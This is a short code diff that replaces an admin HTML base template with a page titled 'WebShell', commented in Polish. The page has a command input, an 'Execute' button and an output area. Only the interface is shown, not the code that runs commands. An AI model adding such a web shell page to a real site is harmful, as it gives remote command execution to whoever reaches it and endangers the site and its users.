@@ -1,11 +1,9 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>{% block title %}Admin{% endblock %}</title>
-    {% block head_css %}{% endblock %}
-    {% block head_js %}{% endblock %}
-</head>
-<body>
-    {% block body %}{% endblock %}
-</body>
-</html>
+{% block content %}
+<!-- Tutaj powinny być elementy interfejsu webshell -->
+<h1>WebShell</h1>
+<form method="post">
+    <input type="text" name="command" value="{{ command }}">
+    <button type="submit">Wykonaj</button>
+</form>
+<pre>{{ result }}</pre>
+{% endblock %}
